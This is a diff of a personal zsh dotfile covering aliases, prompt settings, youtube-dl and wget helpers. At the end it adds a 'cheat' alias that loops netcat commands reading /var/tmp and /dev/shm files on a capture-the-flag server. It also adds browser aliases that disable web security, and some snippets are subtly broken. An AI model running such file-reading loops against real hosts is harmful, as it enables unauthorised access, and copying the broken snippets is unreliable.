@@ -14,19 +14,20 @@ export LANGUAGE=en_US.UTF-8
 
 export SHELL=`which zsh`
 export UPDATE_ZSH_DAYS=7
-export ZSH_DIR=~/.oh-my-zsh
+export ZSH=~/.oh-my-zsh
 export ZSH_THEME="murilasso"
 
 # History display format
-HIST_STAMPS="dd/mm/yyyy"
+# HIST_STAMPS="dd/mm/yyyy"
+# export HISTTIMEFORMAT="%Y-%m-%d %T "
 alias history="history -t'%F %T'"
 
 # oh-my-zsh plugins definition
-plugins=(git)
+# plugins=(git)
 
 # oh-my-zsh source
-# export DISABLE_AUTO_UPDATE="false" 
-source ${ZSH_DIR}/oh-my-zsh.sh
+export DISABLE_AUTO_UPDATE="true" 
+source ${ZSH}/oh-my-zsh.sh
 
 # Watch logins
 watch=all
@@ -52,9 +53,11 @@ fi
 
 export EDITOR='vim'
 
-## Root Prompt should end with "#", thanks SB
+###
+# Root Prompt should end with "#", thanks SB
+###
 
-if [ $USER = "root" ]; then
+if [ `whoami` = "root" ]; then
   export PS1=`echo ${PS1} | sed 's/\%B$\%b/\%B#\%b/'`
 else 
   export PS1=`echo ${PS1} | sed 's/\%B#\%b/\%B$\%b/'`
@@ -70,6 +73,10 @@ elif [ -f /etc/issue ]; then
   export PATH=$PATH:/usr/games  
 elif [ $(uname) '==' 'Darwin' ]; then
   export PATH="/usr/local/bin:/usr/local/sbin:~/bin:$PATH"
+  alias flushdns='sudo discoveryutil mdnsflushcache && sudo discoveryutil udnsflushcaches && sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.discoveryd.plist && sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.discoveryd.plist'
+  alias less='less -m -N -g -i -J --underline-special --SILENT'
+  # alias more='less'
+  alias dd='sudo gdd status=progress bs=4M'
 fi
 
 ###
@@ -114,12 +121,12 @@ fi
 ###
 
 if [ -f /etc/redhat-release ]; then
-  alias cchrome='chromium --user-data-dir="/tmp/chrome_dev_session_`openssl rand -hex 4`"'
-  alias ccchrome='chromium --user-data-dir="/tmp/chrome_dev_session_`openssl rand -hex 4`" --disable-web-security'
+  alias cchrome="chromium --user-data-dir="/tmp/chrome_dev_session_`openssl rand -hex 4`" --disable-web-security"
+  alias ccchrome="chromium --user-data-dir="/tmp/chrome_dev_session_`openssl rand -hex 4`" --disable-web-security"
   alias chrome="cchrome"
 elif [ -f /etc/issue ]; then
-  alias cchrome='chromium-browser --user-data-dir="/tmp/chrome_dev_session_`openssl rand -hex 4`"'
-  alias ccchrome='chromium-browser --user-data-dir="/tmp/chrome_dev_session_`openssl rand -hex 4`" --disable-web-security'
+  alias cchrome="chromium --user-data-dir="/tmp/chrome_dev_session_`openssl rand -hex 4`" --disable-web-security"
+  alias ccchrome="chromium --user-data-dir="/tmp/chrome_dev_session_`openssl rand -hex 4`" --disable-web-security"
   alias chrome="cchrome"
 elif [ $(uname) '==' 'Darwin' ]; then
   alias cchrome='/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --user-data-dir="/tmp/chrome_dev_session_`openssl rand -hex 4`"'
@@ -205,25 +212,68 @@ fi
 
 alias ssh-add-all='ssh-add $(ls ~/.ssh/*.pub | sed 's/.pub//g')'
 
+###
+# wget - mirror site
+###
+
+mirror_site(){
+  # Usage mirror_site http://user:password@subdomain.domain.net:8081/directory/
+  # Thanks https://stackoverflow.com/a/44152897 for the regex
+  URL=$1
+  DOMAIN=`sed -E -e 's_.*://([^/@]*@)?([^/:]+).*_\2_' ${URL}`
+  wget \
+    --recursive \
+    --no-clobber \
+    --page-requisites \
+    --html-extension \
+    --convert-links \
+    --restrict-file-names=windows \
+    --domains ${DOMAIN} \
+    --no-parent \
+    ${URL}
+}
 
 ###
 # Youtube-DL
 ###
 
-alias yout='youtube-dl -f bestvideo+bestaudio'
+# Playlist
 alias youp="youtube-dl \
-  -o './%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s' \
-  --write-annotations \
+  -o '%(uploader)s/%(creator)s_%(channel)s/%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s' \
+  --continue \
+  --ignore-errors \
+  --no-overwrites \
   --download-archive .archive \
   --add-metadata \
+  --all-subs \
+  --embed-subs \
+  --embed-thumbnail \
+  --write-all-thumbnails \
+  --write-annotations \
   --write-info-json \
   --write-thumbnail \
   -f bestvideo+bestaudio \
   --merge-output-format mkv \
+  -i "
+
+# Single / Creator / Channel Based
+alias yout="youtube-dl \
+  -o '%(uploader)s/%(creator)s_%(channel)s/%(title)s.%(ext)s' \
+  --continue \
+  --ignore-errors \
+  --no-overwrites \
+  --download-archive .archive \
+  --add-metadata \
   --all-subs \
   --embed-subs \
-  -i \
-  --embed-thumbnail"
+  --embed-thumbnail \
+  --write-all-thumbnails \
+  --write-annotations \
+  --write-info-json \
+  --write-thumbnail \
+  -f bestvideo+bestaudio \
+  --merge-output-format mkv \
+  -i "
 
 ###
 # Init Screen
@@ -242,14 +292,27 @@ if command -v fortune 2>&1 > /dev/null && command -v cowsay 2>&1 > /dev/null; th
 	command cowsay $(fortune)
 fi
 
-command echo -e "\n###\n# Currently logged in users\n###\n"
-command w
-command who -a
+alias debug-env=' \
+  echo -e "\n###\n# Currently logged in users\n###\n"; \
+  w; \
+  who -a; \
+  echo -e "\n###\n# Disk and Memory\n###\n"; \
+  lsblk -h; \
+  df -h; \
+  free -m; \
+  command echo -e "\n###\n# Tmux Sessions Active\n###\n"; \
+  tmux list-sessions; \
+  command echo -e "\n###\n# Docker Containers Active\n###\n"; \
+  command docker ps -a;
+'
 
-command echo -e "\n###\n# Tmux Sessions Active\n###\n"
-command tmux list-sessions
+## CTF Helpers
 
-if [ -f /usr/bin/docker ]; then
-  command echo -e "\n###\n# Docker Containers Active\n###\n"
-  command docker ps -a
-fi
+alias cheat='
+  while true; \
+  do \
+    echo "cat /var/tmp/* /dev/shm/*; exit" | \
+    nc challenge.me.ooo 8081 >> hello.txt; \
+    sleep 0.1; \
+  done
+'
